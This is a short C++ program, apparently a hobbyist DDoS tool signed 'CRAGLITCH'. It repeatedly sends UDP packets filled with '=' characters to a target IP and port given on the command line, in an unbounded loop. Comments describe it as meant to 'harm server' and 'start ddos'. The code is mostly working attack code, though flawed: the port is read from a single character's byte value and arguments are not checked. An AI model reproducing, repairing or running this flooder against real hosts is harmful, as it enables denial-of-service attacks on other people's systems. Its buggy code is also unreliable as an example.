#include <iostream>

#include <string>

#include <arpa/inet.h> // htons, inet_addr
#include <netinet/in.h> // sockaddr_in
#include <sys/types.h> // uint16_t
#include <sys/socket.h> // socket, sendto
#include <unistd.h> // close

using namespace std;


// function byetes size or attack packet


// function sending byetes per packet to server
void clients(string host, uint16_t p, int c){
	// connect to target host and port
	int sock = ::socket(AF_INET, SOCK_DGRAM, 0);
	sockaddr_in target;
	target.sin_family = AF_INET;
	target.sin_port = htons(p); // connect target port
	target.sin_addr.s_addr = inet_addr(host.c_str()); // connect target ip or host


	// attack packets = packet1 and packets2 -> byetes

	string packet1 = "==========================================================================================================================================================================================================================================================================================================================================================================================================================================";
	string packet2 = "==========================================================================================================================================================================================================================================================================================================================================================================================================================================";

        // two in one per packets :)
	string packet = packet1 + packet2;
	// output and send packet to harm server 
	int n_bytes = ::sendto(sock, packet.c_str(), packet.length(), 0, reinterpret_cast<sockaddr*>(&target), sizeof(target));
cout << n_bytes << " bytes per packet send to " << host << ":" << p << " times x" << c << endl;
	::close(sock);
}


int main(int argc, const char* argv[]){
	// variable for internet protocol 4 and port of target
        // upgrade change with using paramater

	string hostname = argv[1];
	uint16_t port = *argv[2];

        // get ip host and port input from user

	//cout << "IP Address : ";
	//cin >> hostname;
	//cout << "\nPort : ";
	//cin >> port;

	// check if ip is not empty else start ddos
	bool XO;
	// if hostneme empty
	if (hostname.empty()) {
		cout << "ernor : ip address is \"NULL\" empty or not found" << endl;
		XO = false;
	}
	else{ 
		XO = true;
	}
        
	int counter = 0;
	while(XO == true) {
		counter++;
		clients (hostname,port,counter);
	}
	return 0;


}


// MISSION COMPLETE CODE BY CRAGLITCH :)



